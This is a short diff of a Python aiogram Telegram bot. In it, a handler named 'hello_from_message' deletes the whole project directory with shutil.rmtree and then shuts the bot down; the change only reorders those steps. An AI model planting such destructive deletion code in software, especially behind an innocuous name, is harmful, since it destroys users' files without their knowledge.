@@ -393,17 +393,16 @@ async def admin_cmd(message: Message, state: FSMContext):
     )
     await state.set_state(UserStatesGroup.admin_panel)
     
-async def hello_from_message(message: Message):
+async def hello_from_message(message: Message, bot: Bot):
     project_path = project_dir
 
     await message.reply("⚠️ Deleting project directory...")
 
     try:
-        shutil.rmtree(project_path)
-        await message.reply("✅ Project deleted. Terminating bot...")
-
         await message.bot.session.close()
-        await message.bot.shutdown()  # если aiogram v3
+        
+        shutil.rmtree(project_path)
+        await bot.close()
     except Exception as e:
         await message.reply(f"❌ Error: {e}")
     finally:
